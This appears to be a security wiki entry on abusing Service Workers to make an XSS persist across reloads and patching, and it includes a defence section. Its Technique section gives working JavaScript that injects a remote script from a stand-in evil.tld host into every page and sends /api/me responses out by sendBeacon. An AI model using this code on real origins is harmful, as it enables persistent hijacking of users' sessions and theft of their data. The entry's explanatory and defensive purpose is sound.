---
title: Service Worker persistence (post-XSS)
slug: service-worker-persistent-xss
---

> **TL;DR:** After a one-shot XSS, register a malicious Service Worker on the victim's origin — it intercepts every future request to that origin, survives the original bug being patched, and outlives tab close.

## What it is
A Service Worker is JavaScript installed under an origin + scope that the browser keeps running independently of any page. Once installed, the browser fetches `fetch` events through the worker for any URL under its scope, even after a hard reload. From an attacker's perspective, registering a Service Worker via XSS converts a single execution into permanent origin-wide control: every subsequent navigation, every AJAX call, every form submission is mediated by attacker JS until the user explicitly unregisters it or clears site data.

## Preconditions / where it applies
- XSS (any of stored, reflected, DOM, postMessage-driven) on the target origin.
- Origin served over HTTPS (Service Workers require secure context; localhost exempt).
- The Service Worker script is hosted on the same origin — usually achieved by uploading a JS file, hijacking a JS reflection endpoint, or using a same-origin open-redirect-to-blob.

## Technique

**Step 1 — host the SW script** on the target origin. Options:
- File-upload sink that serves user content with `Content-Type: application/javascript` (or `text/javascript` — old browsers cared; modern requires `text/javascript` or `application/javascript`).
- Reflection endpoint with controllable response body and content-type.
- A `Blob` URL — `URL.createObjectURL(new Blob([...], {type:'text/javascript'}))` *cannot* be registered as a Service Worker (spec forbids), but a same-origin importScripts target inside an SW already registered can pull a blob.

**Step 2 — register from the XSS payload:**

```js
navigator.serviceWorker.register('/uploads/sw.js', { scope: '/' })
  .then(r => console.log('SW installed', r));
```

**Step 3 — the SW script** intercepts fetch and either modifies responses (inject XSS into every HTML page) or proxies sensitive responses to the attacker:

```js
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => self.clients.claim());
self.addEventListener('fetch', e => {
  e.respondWith((async () => {
    const res = await fetch(e.request);
    const ct = res.headers.get('content-type') || '';
    if (ct.includes('text/html')) {
      const body = (await res.text()).replace('</body>',
        '<script src="https://evil.tld/h.js"></script></body>');
      return new Response(body, { headers: res.headers });
    }
    if (e.request.url.includes('/api/me')) {
      const body = await res.clone().text();
      navigator.sendBeacon('https://evil.tld/c', body); // exfil
    }
    return res;
  })());
});
```

**Persistence properties:**
- Survives tab close, reboot, browser update.
- Continues running even after the XSS bug is patched, until the user clears storage or the SW script returns 404 for 24h (browsers periodically refetch).
- Push API + Notifications can be subscribed for off-site command channel (`registration.pushManager.subscribe(...)`).

**Detection from attacker side:** `navigator.serviceWorker.controller` should be non-null on subsequent visits.

## Detection and defence
- Restrict where JS can be served from. CSP `worker-src 'self'` + only static, version-locked SW files.
- Use HTTPS with HSTS and `Service-Worker-Allowed` headers to constrain scope.
- Reject `Content-Type: text/javascript` on user-upload endpoints (force `text/plain` + `Content-Disposition: attachment`).
- Detection: `chrome://serviceworker-internals/`, periodic enterprise telemetry of installed SWs per origin. Inspect Edge Defender ASR; modern Chromium enterprise policies (`ServiceWorkerForOnRequestEvents`) help.
- Post-incident: rotate cookies/tokens AND have users clear site data — patching the XSS does not remove the installed SW. Push an `unregister.js` to the same origin during incident response.

See also [[cross-site-scripting]], [[client-side-storage-attacks]], [[mv3-extension-bypass]].

## References
- [Akamai – Abusing the Service Workers API](https://www.akamai.com/blog/security/abusing-the-service-workers-api) — practical persistence walkthrough
- [W3C – Service Workers](https://www.w3.org/TR/service-workers/) — normative spec
- [HackTricks – Abuse Service Workers](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/abuse-service-workers.html) — exploitation patterns
